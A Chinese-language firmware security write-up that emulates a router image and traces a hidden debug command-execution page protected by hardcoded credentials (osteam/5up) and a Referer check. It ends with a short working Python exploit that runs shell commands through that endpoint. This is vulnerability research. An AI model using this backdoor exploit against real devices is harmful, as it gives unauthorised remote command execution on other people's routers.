# 基础信息分析
先binwalk看一下基础信息
![[Pasted image 20240730134717.png]]
squashfs文件系统，大端序
再用firmwalker-pro-max查看它是个什么服务
![[Pasted image 20240730135517.png]]
知道是个httpd服务
# 漏洞分析
用FirmAE模拟起来
firmwalker看到cmd下面的，有个web端是个命令执行的地方，尝试访问一下
![[Pasted image 20240730180926.png]]
访问之前看到有参数，先打开这个文件看一下
![[Pasted image 20240730181302.png]]
妥妥的是个命令执行处，看一下源码
![[Pasted image 20240730181436.png]]
是需要构建url参数cmd=&usr=&passwd=且访问的是DebugResultRpm.htm，于是尝试构建
![[Pasted image 20240730191649.png]]
是个空白页，burp抓包看一下，确实返回了200，尝试在FrimAE的shell模式下看一下，aaa.htm是否存在
![[Pasted image 20240730192232.png]]
![[Pasted image 20240730191944.png]]
发现并没有执行命令，但又返回了200，很奇怪
看到返回提示了"User or Password not correct"，在IDA里面去查询一下
![[Pasted image 20240730192413.png]]
发现查询到，交叉引用去看一下有什么提示
![[Pasted image 20240730192511.png]]
发现它的账号密码对比的是osteam和5up且是写死的，并不是admin默认账号密码
再去尝试一下，把账号和密码改为osteam和5up
![[Pasted image 20240730192739.png]]
发现确实是账号和密码正确了，命令也进去了，看一下shell，发现还是没有写进去
针对上面在IDA里面找到的信息，看一下函数的交叉引用是在哪里调用的
![[Pasted image 20240730193855.png]]
是在这里用到的，看到这里的时候发现上面两行与我们分析的.htm文件名儿比较相似
出于礼貌先拿去在固件包中搜索一下，发现没有这两个文件
![[Pasted image 20240730195246.png]]
于是看着去访问一下能不能访问到
![[Pasted image 20240730194430.png]]
第一个只访问到了一句话
![[Pasted image 20240730194507.png]]
第二个不就是我们要找的命令执行的web端嘛，试一下命令执行，发现成功了
![[Pasted image 20240730195400.png]]
再想一下我们之前构造的url为什么没有成功，用burp抓包看了一下发现
![[Pasted image 20240730200244.png]]
请求头确实并无两样与我们构造的，但是referer的点不一样

这个漏洞怎么说呢，就只算是个后门吧

# exp
```
import requests

burp0_url = "http://192.168.1.1:80/userRpm/DebugResultRpm.htm?cmd=ls&usr=osteam&passwd=5up"
burp0_headers = {"Authorization": "Basic YWRtaW46YWRtaW4=", "Referer": "http://192.168.1.1/userRpmNatDebugRpm26525557/linux_cmdline.html"}
response = requests.get(burp0_url, headers=burp0_headers)

print(response.text)
```



# Tips
这里在ping分析了一段时间，最后发现ip会通过inet_addr()函数验证，所以未来遇到这个函数，可以适当退出，修复方案也可以提出。